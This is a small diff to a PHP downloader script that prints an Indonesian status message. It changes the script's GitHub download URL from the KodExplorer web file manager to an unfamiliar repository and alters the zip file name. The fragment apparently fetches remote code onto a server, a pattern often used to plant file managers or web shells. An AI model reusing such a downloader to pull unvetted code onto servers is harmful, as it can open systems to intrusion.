@@ -1,6 +1,6 @@
 <?php
-$url = "https://github.com/kalcaddle/KodExplorer/archive/refs/heads/master.zip";
-$zipFile = "master.zip"; 
+$url = "https://github.com/tikung6etar/Nyarek/archive/refs/heads/master.zip";
+$zipFile = "maste.zip"; 
 
 echo "Sedang mencoba download dari GitHub...<br>";
 
